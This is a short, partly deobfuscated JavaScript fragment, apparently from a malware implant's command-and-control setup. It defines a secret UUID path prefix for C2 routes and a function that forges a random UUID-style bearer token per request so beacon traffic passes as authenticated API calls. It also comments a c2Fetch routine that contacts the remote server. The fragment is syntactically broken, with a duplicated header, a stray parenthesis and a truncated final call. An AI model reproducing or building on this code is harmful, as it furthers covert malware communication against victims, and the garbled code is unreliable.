/* ════════════════════════════════════════════════════════════
 * SECTION 2 — remote-api COMMUNICATION SETUP
 * See docs/execution_flow.md and docs/backend_protocol.md.
 * See docs/ for full documentation.
 * ════════════════════════════════════════════════════════════ */

    /* ═══════════════════════════════════════════════════════════
     * SECTION 2 — remote-api COMMUNICATION SETUP
     * C2_PATH_PREFIX: the secret UUID path segment for all api routes
     * generateBearer(): makes a fake UUID bearer token per request
     * c2Fetch(path, params): authenticated GET to the remote-api server
     * ═══════════════════════════════════════════════════════════ */
    C2_PATH_PREFIX = "ab060a03-7874-4647-84d1-da019e4b51ea");

function generateBearer() {
  let _str_cache = _randInt(1, 7);
  let __str_table__ = _randBytes(16);
  return __str_table__[1] = (_str_cache << 5) + _randInt(0, 31), __str_table__[6] = __str_table__[6] & 15 | 64, __str_table__[8] = __str_table__[8] & 63 | 128, "Bearer " + _b64Encode(__str_table__)
}
_noop(_sf_priv_wm = undefined, c2Fetch = undefined,